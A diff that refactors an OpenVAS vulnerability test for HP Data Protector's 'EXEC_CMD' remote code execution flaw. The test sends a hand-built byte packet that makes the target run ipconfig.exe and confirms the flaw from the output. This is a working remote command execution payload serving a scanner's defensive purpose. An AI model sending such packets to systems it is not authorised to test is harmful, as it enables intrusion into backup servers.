@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hp_data_protector_exec_cmd_code_exec_vuln.nasl 7203 2017-09-20 13:01:39Z cfischer $
+# $Id: gb_hp_data_protector_exec_cmd_code_exec_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
 #
 # HP (OpenView Storage) Data Protector Client 'EXEC_CMD' Remote Code Execution Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = "cpe:/a:hp:data_protector";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801946");
-  script_version("$Revision: 7203 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-20 15:01:39 +0200 (Wed, 20 Sep 2017) $");
+  script_version("$Revision: 11421 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -48,28 +48,20 @@ if(description)
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101766/hpdp-exec.txt");
   script_xref(name:"URL", value:"http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143");
 
-  tag_impact = "Successful exploitation will allow remote attackers to execute
-  arbitrary Perl code via a crafted command.
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
+  arbitrary Perl code via a crafted command.");
 
-  Impact Level: Application.";
+  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector 6.11 and prior.");
 
-  tag_affected = "HP (OpenView Storage) Data Protector 6.11 and prior.";
-
-  tag_insight = "The specific flaw exists within the filtering of arguments to
+  script_tag(name:"insight", value:"The specific flaw exists within the filtering of arguments to
   the 'EXEC_CMD' command. which allows remote connections to execute files within
-  it's local bin directory.";
+  it's local bin directory.");
 
-  tag_solution = "Upgrade to HP (OpenView Storage) Data Protector A.06.20 or later, For updates refer to
-  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html";
+  script_tag(name:"summary", value:"This host is installed with HP (OpenView Storage) Data Protector and is prone to
+  remote code execution vulnerability.");
 
-  tag_summary = "This host is installed with HP (OpenView Storage) Data Protector and is prone to
-  remote code execution vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"summary", value:tag_summary);
-  script_tag(name:"solution", value:tag_solution);
+  script_tag(name:"solution", value:"Upgrade to HP (OpenView Storage) Data Protector A.06.20 or later, For updates refer to
+  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -85,7 +77,7 @@ get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to th
 soc = open_sock_tcp( port );
 if( ! soc ) exit( 0 );
 
-##  Construct attack string (ipconfig)
+# nb: Attack string (ipconfig)
 req = raw_string(0x00, 0x00, 0x00, 0xa4, 0x20, 0x32, 0x00, 0x20,
                  0x66, 0x64, 0x69, 0x73, 0x6b, 0x79, 0x6f, 0x75,
                  0x00, 0x20, 0x30, 0x00, 0x20, 0x53, 0x59, 0x53,
@@ -108,24 +100,16 @@ req = raw_string(0x00, 0x00, 0x00, 0xa4, 0x20, 0x32, 0x00, 0x20,
                  0x32, 0x5c, 0x69, 0x70, 0x63, 0x6f, 0x6e, 0x66,
                  0x69, 0x67, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00);
 
-## send the data
 send( socket:soc, data:req );
 
-## wait for 5 sec
 sleep( 5 );
 
-## Receive the data
 res = recv( socket:soc, length:4096 );
 
-## Get the response length
 len = strlen( res );
 if( ! len ) exit( 0 );
 
-data = "";
-
-## Iterate response by each characters
 for( i = 0; i < len; i = i + 1 ) {
-  ## Get only Characters from response
   if( ( ord( res[i] ) >= 61 ) ) {
     data = data + res[i];
   }
@@ -133,7 +117,6 @@ for( i = 0; i < len; i = i + 1 ) {
 
 close( soc );
 
-## Confirm the exploit
 if( "WindowsIPConfiguration" >< data && "EthernetadapterLocalAreaConnection" >< data ) {
   security_message( port:port );
   exit( 0 );
